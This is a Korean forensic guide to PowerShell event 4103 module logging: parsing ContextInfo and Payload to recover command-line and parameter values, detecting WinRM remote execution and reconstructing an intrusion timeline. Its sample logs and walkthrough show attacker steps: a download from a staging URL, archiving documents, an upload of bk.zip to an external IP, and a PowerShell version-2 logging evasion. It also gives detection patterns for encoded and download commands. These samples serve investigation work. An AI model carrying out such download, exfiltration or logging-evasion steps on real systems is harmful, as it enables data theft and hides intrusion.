---
id: FOR-0098
title: "PowerShell 4103 모듈 로깅: ContextInfo와 Payload로 인자 값 복원"
slug: "powershell-4103-module-logging"
category: "Event Log"
type: "guide"
difficulty: "intermediate"
priority: "critical"
platform: [windows]
artifact: ["ContextInfo", "Payload", "Host Application", "CommandInvocation", "ParameterBinding", "wsmprovhost.exe"]
file_paths: ["C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-PowerShell%4Operational.evtx", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"]
registry_paths: ["HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging\\ModuleNames"]
event_ids: ["4103"]
protocols: ["WinRM"]
tools: ["EvtxECmd", "Event Viewer", "PowerShell", "Timeline Explorer"]
commands: ["Get-WinEvent -Path ps.evtx -FilterXPath '*[System[EventID=4103]]'", "wevtutil qe Microsoft-Windows-PowerShell/Operational /q:\"*[System[(EventID=4103)]]\" /f:text"]
regex_patterns: ["ParameterBinding\\([^)]+\\): name=\"([^\"]+)\"; value=\"([^\"]*)\"", "Host Application\\s*=\\s*(.+)"]
wireshark_filters: []
tshark_fields: []
log_fields: ["ContextInfo", "Payload", "UserData", "Host Application", "Host Name", "Command Name", "Command Type", "Runspace ID", "Pipeline ID", "Sequence Number", "Connected User", "Shell ID"]
file_formats: ["evtx"]
primary_terms: ["4103", "모듈 로깅", "파이프라인 실행 세부 정보"]
keywords: ["4103", "module logging", "모듈 로깅", "ContextInfo", "Payload", "Host Application", "CommandInvocation", "ParameterBinding", "PowerShell Remoting", "wsmprovhost", "Runspace ID", "Pipeline ID", "evtx"]
aliases: ["4103", "모듈 로깅", "powershell 4103", "파워쉘 인자 값", "powershell 파라미터 로그", "host application", "powershell remoting 흔적"]
symptom_keywords: ["4688에 명령행이 없다", "PowerShell 인자 값을 알고 싶다", "4103이 너무 많아 못 본다", "원격 PowerShell 실행인지 알고 싶다", "어떤 커맨드릿이 실행됐는지"]
related: ["FOR-0097", "FOR-0121", "FOR-0088"]
source_ids: ["SRC-023", "SRC-016", "SRC-022"]
last_verified: "2026-09-10"
status: "verified"
---

## 한 줄 결론

4103은 실행된 **커맨드릿과 그 파라미터에 실제로 넘어간 값**을 `Payload`에 남기고, `ContextInfo`의 `Host Application`에 **전체 명령행**을 남긴다. 4688 감사가 꺼져 명령행을 못 구할 때의 1순위 대체 증거다.

## 어떤 문제에서 필요한가

- "4688이 없거나 `CommandLine` 감사가 꺼져 있다. PowerShell 명령행을 어디서 구하나"
- "`Invoke-WebRequest`에 넘어간 URL은 무엇인가" — 인자 값 복원
- "원격에서 실행된 PowerShell인가" — `Host Application`이 `wsmprovhost.exe`인지
- "어떤 계정이 실행했는가" — `User` / `Connected User`
- "같은 파이프라인에서 무엇이 연달아 실행됐나" — `Pipeline ID`, `Sequence Number`
- 스크립트 본문(4104)은 지워졌지만 4103만 남은 경우

코드 본문 자체와 `-EncodedCommand` 해독은 4104 전담 글(FOR-0097)이 담당한다. **4104는 코드, 4103은 실행된 명령과 값이다.**

## 문제에서 처음 볼 단서

1. `Microsoft-Windows-PowerShell%4Operational.evtx`가 있고 4104는 비어 있다 → 4103
2. Security.evtx에 4688이 없거나 명령행 필드가 비어 있다 → 4103의 `Host Application`
3. 지문이 "다운로드 URL", "압축한 파일 이름", "접속한 호스트" → `ParameterBinding` 값
4. 지문에 "원격에서", "WinRM", "Enter-PSSession" → `Host Application` = `wsmprovhost.exe`
5. 4103이 수만 건이다 → 필터 설계가 먼저다

## 30초 절차

```powershell
# 원본: Microsoft-Windows-PowerShell%4Operational.evtx -> ps.evtx
Get-WinEvent -Path 'C:\case\ps.evtx' -FilterXPath '*[System[EventID=4103]]' | Format-List
```

바로 쓸 수 있는 형태로 파싱한다.

```powershell
$ps = 'C:\case\ps.evtx'

$m = Get-WinEvent -Path $ps -FilterXPath '*[System[EventID=4103]]' |
  ForEach-Object {
    $x = [xml]$_.ToXml()
    $d = @{}
    $x.Event.EventData.Data | ForEach-Object { $d[$_.Name] = $_.'#text' }
    $ctx = @{}
    foreach ($line in ($d['ContextInfo'] -split "`r?`n")) {
      if ($line -match '^\s*(.+?)\s*=\s*(.*)$') { $ctx[$matches[1]] = $matches[2] }
    }
    [pscustomobject]@{
      TimeUtc  = $_.TimeCreated.ToUniversalTime()
      Cmd      = $ctx['Command Name']
      CmdType  = $ctx['Command Type']
      HostApp  = $ctx['Host Application']
      HostName = $ctx['Host Name']
      User     = $ctx['User']
      Runspace = $ctx['Runspace ID']
      Pipeline = $ctx['Pipeline ID']
      Seq      = $ctx['Sequence Number']
      Payload  = $d['Payload']
    }
  } | Sort-Object TimeUtc

$m | Select-Object -First 20 TimeUtc, Cmd, User, HostName | Format-Table -AutoSize
```

## 상세 절차

### 1단계 — EventData는 세 개뿐이다

| 필드 | 내용 |
| --- | --- |
| `ContextInfo` | 실행 문맥. 여러 줄의 `이름 = 값` 텍스트 한 덩어리 |
| `Payload` | `CommandInvocation` / `ParameterBinding` 등 실제 호출 내역 |
| `UserData` | 대개 빈 값. 공급자가 추가 정보를 넣을 때만 채워진다 |

즉 이름 있는 필드로 바로 조회할 수 있는 것은 세 개뿐이고, **필요한 값은 전부 `ContextInfo` 문자열 안에 있다.** 그래서 파싱이 필수다.

### 2단계 — ContextInfo 항목표

| 항목 | 의미 | 포렌식 활용 |
| --- | --- | --- |
| `Severity` | 심각도 | 대개 `Informational` |
| `Host Name` | 호스트 이름 | `ConsoleHost` / `Windows PowerShell ISE Host` / `ServerRemoteHost` |
| `Host Version` | 호스트 버전 | PowerShell 버전. `2.0`이면 **다운그레이드 공격 의심** |
| `Host ID` | 호스트 인스턴스 GUID | 같은 프로세스의 이벤트를 묶는 키 |
| `Host Application` | **전체 명령행** | `powershell.exe -nop -w hidden -enc ...` 전체가 들어온다 |
| `Engine Version` | 엔진 버전 | 호스트 버전과 함께 본다 |
| `Runspace ID` | 런스페이스 GUID | **세션 단위 묶음 키** |
| `Pipeline ID` | 파이프라인 번호 | 한 파이프라인 안의 명령들을 묶는다 |
| `Command Name` | 실행된 명령 이름 | `Invoke-WebRequest`, `New-Object` 등 |
| `Command Type` | `Cmdlet` / `Function` / `Script` / `Alias` / `ExternalScript` | `ExternalScript`면 `.ps1` 파일 실행 |
| `Script Name` | 실행 중인 스크립트 파일 경로 | 있으면 그 파일을 찾는다 |
| `Command Path` | 외부 스크립트/명령의 경로 | `Script Name`과 함께 본다 |
| `Sequence Number` | 세션 내 실행 순번 | **순서 복원 키.** 시각이 같아도 이 값으로 정렬 |
| `User` | 실행 계정 | `HOSTNAME\user` |
| `Connected User` | 원격 접속 사용자 | 원격 실행일 때만 채워진다 |
| `Shell ID` | `Microsoft.PowerShell` 등 | 제약 있는 엔드포인트면 다른 값 |

**`Host Application`이 이 글의 핵심이다.** 4688의 `CommandLine` 감사(기본 꺼짐)와 무관하게, PowerShell이 스스로 자기 명령행을 기록한다. `-EncodedCommand`의 base64도 여기 그대로 들어오므로 4104가 없어도 명령을 복원할 수 있다.

### 3단계 — Payload에서 인자 값 복원

`Payload`는 다음 두 줄 형태가 반복된다.

```text
CommandInvocation(Invoke-WebRequest): "Invoke-WebRequest"
ParameterBinding(Invoke-WebRequest): name="Uri"; value="http://cdn-update.example.net:8080/pkg/a7f2.dat"
ParameterBinding(Invoke-WebRequest): name="OutFile"; value="C:\Users\svc_backup\AppData\Local\Temp\a.dat"
ParameterBinding(Invoke-WebRequest): name="UseBasicParsing"; value="True"
```

`CommandInvocation`은 "무엇을 불렀나", `ParameterBinding`은 "무엇을 넘겼나"다. **변수로 감춰진 값도 바인딩 시점에는 실제 값으로 풀려 기록된다.** 4104의 코드가 `$u`를 넘기더라도 여기서는 URL 문자열이 보인다.

```powershell
# 모든 4103 의 ParameterBinding 값만 추출
$m | ForEach-Object {
  foreach ($line in ($_.Payload -split "`r?`n")) {
    if ($line -match 'ParameterBinding\((?<c>[^)]+)\): name="(?<n>[^"]+)"; value="(?<v>.*)"') {
      [pscustomobject]@{
        TimeUtc = $_.TimeUtc
        Command = $matches['c']
        Param   = $matches['n']
        Value   = $matches['v']
      }
    }
  }
} | Where-Object { $_.Value -match 'http|\\\\|\.exe|\.dat|\.zip|[0-9]{1,3}(\.[0-9]{1,3}){3}' } |
  Format-Table -AutoSize
```

출력:

```text
TimeUtc              Command            Param    Value
-------              -------            -----    -----
2026-03-14 07:20:09  Invoke-WebRequest  Uri      http://cdn-update.example.net:8080/pkg/a7f2.dat
2026-03-14 07:20:09  Invoke-WebRequest  OutFile  C:\Users\svc_backup\AppData\Local\Temp\a.dat
2026-03-14 07:24:50  Compress-Archive   Path     C:\Users\jhkim\Documents\*.xlsx
2026-03-14 07:24:50  Compress-Archive   DestinationPath  C:\Windows\Temp\bk.zip
2026-03-14 07:25:33  New-Object         TypeName Net.Sockets.TCPClient
```

이 표 자체가 침해 타임라인이다.

### 4단계 — 4104와의 역할 구분

| 질문 | 4104 | 4103 |
| --- | --- | --- |
| 실행된 코드 본문 | **있다** (`ScriptBlockText`) | 없다 |
| 실제로 넘어간 인자 값 | 코드에 리터럴로 있을 때만 | **있다** (`ParameterBinding`) |
| 전체 명령행 | 없다 | **있다** (`Host Application`) |
| 호스트/원격 여부 | 없다 | **있다** (`Host Name`, `Connected User`) |
| 실행 순서 | 시각 + `MessageNumber` | `Sequence Number`, `Pipeline ID` |
| 조각 분할 | **있다** (재조립 필요) | 없다 (이벤트 하나가 호출 하나) |
| 건수 | 스크립트 블록 수만큼 | **호출마다 1건. 압도적으로 많다** |
| 난독화 상태 | 난독화된 원문 그대로 | 바인딩 시점의 **풀린 값** |

정리하면 **4104로 "무슨 코드를 실행했는지", 4103으로 "그 코드가 실제로 어떤 값을 썼는지"** 를 얻는다. 둘 다 있으면 4103부터 훑는 편이 빠르다. 값이 바로 보이기 때문이다.

### 5단계 — 원격 실행 판정

| `Host Application` / `Host Name` | 판정 |
| --- | --- |
| `Host Name = ConsoleHost` + `powershell.exe ...` | 로컬 콘솔 실행 |
| `Host Name = Windows PowerShell ISE Host` | ISE에서 실행. 사람이 편집하며 실행 |
| `Host Application`에 `wsmprovhost.exe` | **PowerShell Remoting(WinRM). 원격 실행** |
| `Host Name = ServerRemoteHost` | 원격 세션의 서버 측 호스트 |
| `Connected User`가 채워져 있다 | 원격 접속 사용자. 그 계정이 실제 조작자 |
| `Host Application`이 `powershell.exe`가 아닌 임의 exe | **PowerShell을 임베드한 프로그램.** 커스텀 로더/공격 도구 의심 |
| `Host Version = 2.0` | `-Version 2` 다운그레이드. 스크립트 블록 로깅 회피 시도 |

`wsmprovhost.exe`가 보이면 즉시 Security 로그의 4624 `LogonType` 3과 WinRM 채널을 대조한다. 원격 실행은 **다른 호스트가 출발점**이라는 뜻이다.

```powershell
$m | Where-Object { $_.HostApp -match 'wsmprovhost' } |
  Select-Object TimeUtc, User, HostName, Cmd | Format-Table -AutoSize
```

### 6단계 — 노이즈 필터 (필수)

4103은 커맨드릿 **호출 단위**로 기록된다. 정상 사용만으로도 수만 건이 쌓이므로 그대로는 볼 수 없다.

| 버릴 대상 | 이유 |
| --- | --- |
| `Command Name` = `Out-Default`, `Out-String`, `Out-Host`, `Write-Host`, `Format-*` | 출력 파이프라인의 기본 동작 |
| `Command Name` = `prompt`, `Set-StrictMode`, `Get-Command`, `Get-Help` | 셸/모듈 초기화 |
| `Payload`가 `ParameterBinding` 없이 `CommandInvocation`만 | 인자 없는 호출. 정보량 낮음 |
| `Host Name` = 백업/모니터링 에이전트 | 관리 자동화 |
| 반복되는 동일 `Command Name` + 동일 값 | 스케줄된 정상 작업 |

남길 대상은 반대로 좁게 잡는다.

```powershell
$hot = @(
  'Invoke-WebRequest','Invoke-RestMethod','Invoke-Expression','Invoke-Command',
  'New-Object','Add-Type','Start-Process','Start-Job','Compress-Archive',
  'Set-ItemProperty','New-ItemProperty','New-Service','Set-Service',
  'Register-ScheduledTask','New-ScheduledTask','Get-Credential','ConvertTo-SecureString',
  'Get-WmiObject','Invoke-WmiMethod','Get-CimInstance','Invoke-CimMethod',
  'Copy-Item','Remove-Item','Out-File','Set-Content','Enter-PSSession','New-PSSession'
)

$m | Where-Object { $_.Cmd -in $hot } |
  Select-Object TimeUtc, User, Cmd, HostName |
  Sort-Object TimeUtc | Format-Table -AutoSize
```

값 기준으로 거르는 방법이 더 강력할 때도 많다.

```powershell
$m | Where-Object { $_.Payload -match 'http://|https://|\\\\[a-zA-Z0-9._-]+\\|FromBase64String|DownloadString|-enc ' } |
  Select-Object TimeUtc, Cmd, User | Format-Table -AutoSize
```

### 7단계 — 활성 여부와 꺼져 있을 때의 대안

| 경로 | 값 이름 | 효과 |
| --- | --- | --- |
| `HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging` | `EnableModuleLogging` = 1 | 4103 기록 |
| `HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging\ModuleNames` | 값 이름 `*`, 데이터 `*` | **모든 모듈** 대상 |

`ModuleNames`에 특정 모듈만 들어 있으면 그 모듈의 커맨드릿만 기록된다. 4103이 있는데 원하는 명령이 안 보이면 **이 목록이 좁게 설정된 것**일 수 있다. SOFTWARE hive에서 직접 확인한다([FOR-0051](./registry-hive-map.html)).

4103이 없을 때의 대안 순서:

| 순위 | 대체 증거 | 얻을 수 있는 것 |
| --- | --- | --- |
| 1 | 4104 (FOR-0097) | 코드 본문 |
| 2 | `Windows PowerShell.evtx` 400 / 800 | `HostApplication`(전체 명령행) |
| 3 | 전사 파일 `PowerShell_transcript.*.txt` | 입력과 출력 전문 |
| 4 | 4688 + `SubjectLogonId` | 명령행(감사 켜져 있을 때) |
| 5 | Sysmon 1 `CommandLine` | 항상 기록되는 명령행 |
| 6 | `ConsoleHost_history.txt` | 콘솔 입력 이력(PSReadLine) |

## 출력 필드 해석

시간대는 EVTX `SystemTime` 기준 **UTC**다. `Sequence Number`가 있으므로 초 이하 해상도가 겹칠 때는 시각보다 이 값을 신뢰한다. 답이 KST면 +9시간.

| 상황 | 해석 |
| --- | --- |
| `Command Type = ExternalScript` | `.ps1` 파일이 실행됐다. `Command Path`에 경로가 있다 |
| `Command Type = Alias` | 별칭 호출. 원래 이름은 `CommandInvocation`에서 확인 |
| 같은 `Pipeline ID` 여러 건 | 한 줄 파이프라인의 각 단계 |
| 같은 `Runspace ID` 여러 건 | 같은 세션. 세션 전체 활동을 이 키로 묶는다 |
| `Connected User`만 채워짐 | 원격 세션. `User`는 위임된 실행 계정 |
| `Payload`에 `ParameterBinding` 없음 | 인자 없이 호출됐거나 바인딩 로깅이 제한된 경우 |

## pivot: 다음에 볼 artifact

| 여기서 얻은 값 | 다음에 볼 것 | 확인할 내용 |
| --- | --- | --- |
| `ParameterBinding` URL | pcap `http.request` / DNS 질의 | 실제 통신 발생 여부 |
| `ParameterBinding` 파일 경로 | `$MFT` ([FOR-0021](./mft-basics.html)) | 그 파일의 생성 시각과 존재 |
| `Host Application`의 base64 | 4104 (FOR-0097) | 디코딩한 스크립트 본문 |
| `Runspace ID` | 같은 ID의 4103 전체 | 세션 단위 명령 시퀀스 |
| `wsmprovhost.exe` | 4624 `LogonType` 3, WinRM 채널 | 원격 출발지 호스트와 계정 |
| `User` | 4624의 `TargetLogonId` ([FOR-0083](./event-4624-logon.html)) | 로그온 세션과 접속 IP |
| `Compress-Archive` 대상 | 그 zip 파일과 유출 트래픽 | 데이터 유출 증거 |
| 지속성 커맨드릿 | Run 키·서비스·예약 작업 | 실제 등록 여부 |

## 흔한 함정

- **`ContextInfo`를 이름 있는 필드로 조회하려는 것.** EventData에는 `ContextInfo`, `Payload`, `UserData` 세 개만 있다 → `ContextInfo` 문자열을 줄 단위로 쪼개 `이름 = 값`으로 파싱한다.
- **`ContextInfo` 레이블이 영어라고 가정하는 것.** OS 표시 언어에 따라 레이블이 번역되어 나올 수 있다 → 정규식이 아무것도 못 잡으면 `ContextInfo` 원문을 먼저 출력해 실제 레이블을 확인한다.
- **필터 없이 4103을 여는 것.** 커맨드릿 호출마다 1건이라 수만 건이 나온다 → `Command Name` 화이트리스트 또는 `Payload` 값 패턴으로 먼저 줄인다.
- **`Out-Default`·`Write-Host` 같은 노이즈를 증거로 채택하는 것.** 셸의 기본 동작이다 → 위 노이즈 표를 먼저 제외한다.
- **4103만 보고 코드 전체를 알았다고 생각하는 것.** 4103에는 스크립트 본문이 없다 → 제어 흐름·조건문이 필요하면 4104를 본다.
- **`Host Application`을 무시하고 4688이 없다고 포기하는 것.** PowerShell이 자기 명령행을 스스로 기록한다 → 4103·400·800의 `Host Application`이 명령행의 대체 증거다.
- **원격 실행을 로컬로 오판하는 것.** `Host Application`이 `wsmprovhost.exe`면 WinRM 원격이다 → 출발지 호스트를 따로 조사해야 한다.
- **`Host Version = 2.0`을 흘려보내는 것.** `powershell -Version 2`로 내려가면 스크립트 블록 로깅이 적용되지 않는다 → 로깅 회피 시도로 기록한다.
- **시각만으로 순서를 정하는 것.** 같은 초에 여러 호출이 몰린다 → `Runspace ID` + `Sequence Number`로 정렬한다.
- **Event Viewer의 로컬 시각으로 답하는 것.** 내부 저장은 UTC다 → KST 요구 시 +9시간.

## 교차검증

```powershell
$ps  = 'C:\case\ps.evtx'
$sec = 'C:\case\Security.evtx'

# 1) 4103 건수와 Command Name 상위 목록 (필터 설계용)
$m | Group-Object Cmd | Sort-Object Count -Descending | Select-Object -First 20 Count, Name

# 2) Host Application 종류 (원격/임베드 판정)
$m | Group-Object HostApp | Sort-Object Count -Descending | Select-Object -First 10 Count, Name

# 3) 같은 시각의 4104 — 코드 본문
Get-WinEvent -Path $ps -FilterXPath '*[System[EventID=4104]]' |
  Where-Object { $_.TimeCreated -gt '2026-03-14 07:20:00' -and $_.TimeCreated -lt '2026-03-14 07:21:00' }

# 4) 4688 — 명령행이 실제로 감사됐는지
Get-WinEvent -FilterHashtable @{Path=$sec; Id=4688} |
  Where-Object { $_.Message -match 'powershell' } | Select-Object -First 5 TimeCreated, Message

# 5) 전사 파일
Get-ChildItem 'C:\case\mount\Users\*\Documents\PowerShell_transcript*' -Recurse -ErrorAction SilentlyContinue
```

4103의 `Host Application`, 4104의 본문, 4688의 `CommandLine`이 같은 문자열을 가리키면 확정이다. 4103만 있으면 "인자 값은 확정, 코드 흐름은 미확인"으로 구분해 답한다.

## mini walkthrough

```text
문제:
"공격자가 유출을 위해 압축한 파일의 경로와, 압축 대상 폴더를 답하시오.
 첨부: Microsoft-Windows-PowerShell%4Operational.evtx (4103: 18,442건 / 4104: 0건)"

1. 첫 시도 (실패):
   4104 를 먼저 찾았다. 0건.
   "스크립트 블록 로깅이 꺼져 있어 명령을 복원할 수 없다" 고 판단하고
   Security.evtx 의 4688 로 갔다. 4688 도 없었다(감사 미설정).
   -> 여기서 막혔다고 결론. 오답.

   왜 틀렸나:
   4103 이 18,442건 있었는데 "모듈 로깅은 커맨드릿 이름만 남는다"고 잘못 알고 넘겼다.
   4103 의 Payload 에는 ParameterBinding 으로 인자 값이 그대로 들어 있다.

2. 피벗 — 4103 의 Payload 를 값 기준으로 긁었다.
   $m | Where-Object { $_.Payload -match 'zip|Compress|\.xlsx' }

   TimeUtc              Cmd               Payload 발췌
   2026-03-14 07:24:50  Compress-Archive  name="Path"; value="C:\Users\jhkim\Documents\*.xlsx"
   2026-03-14 07:24:50  Compress-Archive  name="DestinationPath"; value="C:\Windows\Temp\bk.zip"

3. 노이즈 확인 — 처음 필터 없이 열었을 때 상위 Command Name:
   Count Name
   ----- ----
   6120  Out-Default
   4318  Write-Host
   2044  Format-Table
     31  Invoke-WebRequest
      2  Compress-Archive
   -> 상위 3개를 버리는 것만으로 볼 수 있는 크기가 된다.

4. 실행 문맥 확인 (ContextInfo):
   Host Name        = ServerRemoteHost
   Host Application = C:\Windows\system32\wsmprovhost.exe -Embedding
   User             = WIN10\svc_backup
   Connected User   = CORP\svc_backup
   Runspace ID      = 5d1c9f22-...
   Sequence Number  = 214
   -> 로컬 콘솔이 아니라 WinRM 원격 실행이었다.
      출발지는 이 호스트가 아니다. 4624 Type 3 을 확인해야 한다.

5. 같은 Runspace ID 로 묶어 시퀀스 복원:
   Seq 198  Get-ChildItem     Path="C:\Users\jhkim\Documents"
   Seq 214  Compress-Archive  Path="...\*.xlsx"  Destination="C:\Windows\Temp\bk.zip"
   Seq 229  Invoke-WebRequest Uri="http://45.146.164.9:8080/up"  InFile="C:\Windows\Temp\bk.zip"

6. 시간대: 07:24:50 UTC = 16:24:50 KST (+9h)

정답: 압축 파일 C:\Windows\Temp\bk.zip, 압축 대상 C:\Users\jhkim\Documents\*.xlsx
```

1단계의 오판이 이 글의 존재 이유다. **4104가 0건이어도 4103이 있으면 인자 값은 복원된다.** 그리고 `Host Application` 한 줄이 "원격 실행"이라는 사건의 성격을 바꿔 놓았다.

## 막혔을 때 다음 체크

1. `ContextInfo`를 파싱했는가 → 필요한 값은 전부 그 문자열 안에 있다
2. `Payload`의 `ParameterBinding`을 봤는가 → 여기에 실제 인자 값이 있다
3. 노이즈를 제외했는가 → `Out-Default`/`Write-Host`/`Format-*`
4. `Host Application`을 확인했는가 → 명령행, 원격 여부, 임베드 여부가 한 줄에 다 있다
5. `Runspace ID` + `Sequence Number`로 정렬했는가 → 시각만으로는 순서가 틀어진다
6. 원하는 커맨드릿이 없는가 → `ModuleNames`가 좁게 설정됐을 수 있다
7. 4103이 아예 없는가 → 4104 → `Windows PowerShell.evtx` 400/800 → 전사 파일 → Sysmon 1 순서
8. 인자 값에 URL/IP가 있는가 → pcap과 Sysmon 3으로 실제 통신을 확인한다
9. 문자열 검색이 편하면 CSV로 내려 `Select-String`을 쓴다([FOR-0121](./powershell-select-string.html))

## 출처

- SRC-023 — Microsoft Learn, about_Logging_Windows: 모듈 로깅(4103) 활성 정책, `ModuleLogging`·`ModuleNames` 레지스트리 구조, 스크립트 블록 로깅과의 차이
- SRC-016 — MITRE ATT&CK T1059.001 PowerShell: 원격 실행·다운그레이드·다운로드 실행 등 관측되는 실행 형태
- SRC-022 — Microsoft Learn, Advanced security audit policy settings: 대조에 쓰는 4688·4624의 정의와 명령행 감사가 기본 비활성인 점
- `ContextInfo`의 항목 이름과 순서는 PowerShell 버전 및 OS 표시 언어에 따라 달라질 수 있다. 파싱 전에 실제 이벤트의 `ContextInfo` 원문을 한 번 출력해 확인할 것
- `Payload`의 `CommandInvocation` / `ParameterBinding` 표기는 버전에 따라 세부 형식이 다를 수 있으므로, 정규식은 실제 로그 한 건으로 먼저 검증할 것
